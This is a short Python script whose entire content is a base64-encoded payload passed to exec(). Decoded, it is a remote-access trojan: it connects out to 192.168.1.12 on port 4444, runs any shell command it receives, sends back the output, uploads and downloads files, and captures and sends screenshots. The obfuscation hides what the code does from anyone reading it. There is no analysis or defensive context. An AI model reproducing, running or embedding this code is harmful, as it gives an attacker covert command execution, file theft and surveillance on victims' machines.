import base64
exec(base64.b64decode(b"""CmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgpkZWYgY29ubmVjdCgpOgogICAgcyA9IHNvY2tldC5zb2NrZXQoKQogICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xLjEyIiwgNDQ0NCkpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgY21kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpCiAgICAgICAgICAgIGlmIGNtZC5zdGFydHN3aXRoKCJkb3dubG9hZCAiKToKICAgICAgICAgICAgICAgIGZpbGVwYXRoID0gb3MucGF0aC5leHBhbmR1c2VyKGNtZC5zcGxpdCgiICIsIDEpWzFdKQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZXBhdGgpOgogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoMTAyNCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgICAgICAgICBzLnNlbmQoYiI8RU5EPiIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHMuc2VuZChiIkZpbGUgbm90IGZvdW5kPEVORD4iKQogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZWxpZiBjbWQuc3RhcnRzd2l0aCgidXBsb2FkICIpOgogICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLmV4cGFuZHVzZXIoY21kLnNwbGl0KCIgIiwgMSlbMV0pCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZXBhdGgsICJ3YiIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBiIjxFTkQ+IiBpbiBkYXRhOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kX2luZGV4ID0gZGF0YS5maW5kKGIiPEVORD4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShkYXRhWzplbmRfaW5kZXhdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZWxpZiBjbWQgPT0gInNjcmVlbnNob3QiOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGltcG9ydCBweWF1dG9ndWkKICAgICAgICAgICAgICAgICAgICBpbXBvcnQgaW8KICAgICAgICAgICAgICAgICAgICBpbWdfYnl0ZXMgPSBpby5CeXRlc0lPKCkKICAgICAgICAgICAgICAgICAgICBzY3JlZW5zaG90ID0gcHlhdXRvZ3VpLnNjcmVlbnNob3QoKQogICAgICAgICAgICAgICAgICAgIHNjcmVlbnNob3Quc2F2ZShpbWdfYnl0ZXMsIGZvcm1hdD0iUE5HIikKICAgICAgICAgICAgICAgICAgICBmb3IgY2h1bmsgaW4gW2ltZ19ieXRlcy5nZXR2YWx1ZSgpW2k6aSsxMDI0XSBmb3IgaSBpbiByYW5nZSgwLCBsZW4oaW1nX2J5dGVzLmdldHZhbHVlKCkpLCAxMDI0KV06CiAgICAgICAgICAgICAgICAgICAgICAgIHMuc2VuZChjaHVuaykKICAgICAgICAgICAgICAgICAgICBzLnNlbmQoYiI8RU5EPiIpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgcy5zZW5kKGYiRmFpbGVkIHRvIHRha2Ugc2NyZWVuc2hvdDoge2V9PEVORD4iLmVuY29kZSgpKQogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgb3V0cHV0ID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoY21kKQogICAgICAgICAgICBpZiBvdXRwdXQgPT0gIiI6CiAgICAgICAgICAgICAgICBvdXRwdXQgPSAiWytdIENvbW1hbmQgZXhlY3V0ZWQuIgogICAgICAgICAgICBzLnNlbmQob3V0cHV0LmVuY29kZSgpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgYnJlYWsKCmNvbm5lY3QoKQo="""))